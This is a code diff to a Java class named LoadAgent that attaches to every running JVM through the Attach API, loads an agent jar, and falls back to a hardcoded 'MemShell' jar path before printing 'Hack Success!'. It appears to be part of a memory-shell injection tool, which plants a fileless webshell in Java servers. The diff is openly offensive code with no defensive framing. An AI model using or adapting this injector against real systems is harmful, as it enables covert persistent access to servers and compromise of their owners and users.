@@ -24,7 +24,6 @@ public class LoadAgent {
             Class MyVirtualMachine = Class.forName("com.sun.tools.attach.VirtualMachine");
             Class MyVirtualMachineDescriptor = Class.forName("com.sun.tools.attach.VirtualMachineDescriptor");
             List<VirtualMachineDescriptor> listVD = list();
-            System.out.println("Running JVM list ...");
 
             for (int i = 0; i < listVD.size(); i++) {
                 Object o = listVD.get(i);
@@ -35,7 +34,12 @@ public class LoadAgent {
                     java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{java.lang.String.class});
                     java.lang.Object vm = attach.invoke(o, new String[]{id});
                     java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent", new Class[]{java.lang.String.class});
-                    loadAgent.invoke(vm, new String[]{path});
+                    loadAgent.setAccessible(true);
+                    try {
+                        loadAgent.invoke(vm, new String[]{path});
+                    }catch (Exception e){
+                        loadAgent.invoke(vm, new String[]{"D:\\blog\\github\\MemShell\\target\\MemShell-1.0-SNAPSHOT-jar-with-dependencies.jar"});
+                    }
                     java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", null);
                     detach.invoke(vm, null);
                     System.out.println("Hack Success!");
